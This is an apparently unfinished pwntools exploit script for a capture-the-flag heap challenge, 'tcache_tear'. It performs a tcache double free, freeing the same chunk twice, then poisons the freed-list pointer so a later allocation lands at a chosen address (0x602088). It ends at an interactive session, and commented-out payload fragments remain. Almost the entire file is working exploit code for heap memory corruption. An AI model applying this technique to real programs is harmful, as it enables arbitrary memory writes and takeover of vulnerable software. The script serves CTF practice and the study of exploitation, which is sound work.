#!/usr/bin/python3

from pwn import *

exe = ELF('tcache_tear_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

def create(size, data):
        sla(b"choice :", b"1")
        sla(b"Size:", size)
        sa(b"Data:", data)
def delete():
        sla(b"choice :", b"2")
def show():
        sla(b"choice :", b"3")
sa(b"Name:", b"a"*0x20)
create(b"144", b"wan")
delete()
delete()
create(b"144", p8(0x60))
create(b"144", p64(0x602088))
# payload = flat(0,0,
#                0,0,
#                0,0,
#                0,0,
#                0,0,
#                0,0xa1, 0x0000000000602088)
# create(b"144", payload)


# create(b"144", b"wan")
# delete()
# delete()


p.interactive()
